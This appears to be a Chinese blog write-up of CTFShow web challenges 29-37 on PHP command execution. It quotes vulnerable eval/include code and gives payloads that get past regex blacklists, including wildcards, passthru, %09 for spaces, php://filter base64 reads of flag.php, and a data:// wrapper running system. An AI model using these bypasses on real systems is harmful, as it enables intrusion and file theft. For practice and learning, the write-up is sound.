---
title: CTFShow-web-命令执行
tags: 
  - web
  - CTF
permalink: /archives/41279/
published: 2023-4-28 22:15:59
---

# web29

源码：

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:26:48
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

分析源码得知过滤了字符串`flag和i`

`system("ls")`命令执行成功，那就是要读取flag文件

![image-20230428210800449](https://img.crzliang.cn/blog/image-20230428210800449.png)

因为`flag`是被过滤的，但是可以利用*代替完整的文件名去读取文件

然后`cat`在这题是读不出flag的，因为flag存储在一个`php`文件中，然后`cat`是将文件内容按行顺序输出的，如果要用`cat`去读的话，是按照`<?php`格式去执行，但是因为文件中没有`echo`输出，所以就无法读出flag，`tac`是将文件内容按行倒序输出的，就避开了`<?php`，就可以正常的输出flag了

![image-20230428211731575](https://img.crzliang.cn/blog/image-20230428211731575.png)

# web30

源码：

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:42:26
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

因为`system`函数被过滤了，只能考虑其他的函数，其他的函数还有`exec、passthru、反撇号和shell_exec`其中只有`passthru`和`system`会有输出到浏览器不需要echo或return来查看结果

![image-20230428213258476](https://img.crzliang.cn/blog/image-20230428213258476.png)

读flag和web29一样

![image-20230428213308870](https://img.crzliang.cn/blog/image-20230428213308870.png)

# web31

源码：

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:49:10
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

这里涉及到空格绕过，可以用`%09`绕过，`system`函数也是被过滤的，这里可以直接用`echo`命令输出查看的内容

![image-20230428234037253](https://img.crzliang.cn/blog/image-20230428234037253.png)

# web32

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:56:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
} 
```

这题过滤了system、shell、echo等函数

php中还有一些函数是不用括号的：

```php
<?php
echo 111;
print 1111;
die;
include "/etc/passwd";
require "/etc/passwd";
include_once "/etc/passwd";
require_once "/etc/passwd";
?>
```

其中`include "/etc/passwd"`是可以利用的

![image-20230429000203174](https://img.crzliang.cn/blog/image-20230429000203174.png)

源码里面也没有对`$`进行过滤，用`$_POST[x]`或者`$_GET[x]`，然后用php伪协议将include包含的文件显示出来

payload：`?c=include"$_GET[url]"?>&url=php://filter/read=convert.base64-encode/resource=flag.php`

base64解码：

![image-20230428235716076](https://img.crzliang.cn/blog/image-20230428235716076.png)

# web33

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 02:22:27
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/
//
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

方法同上，只不过是这题过滤了双引号，所以把payload改成：

`?c=include$_GET[url]?>&url=php://filter/read=convert.base64-encode/resource=flag.php`即可

![image-20230429001355876](https://img.crzliang.cn/blog/image-20230429001355876.png)

# web34-36

用web33的payload即可，原理一样

# web37

```php
 <?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:12:34
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 05:18:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
*/

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
} 
```

代码中将c进行了包含，再输出flag

那么就利用伪协议去读flag

payload：`c=data://text/plain,<?php system('tac fla*');?>`

![image-20230429134736155](https://img.crzliang.cn/blog/image-20230429134736155.png)
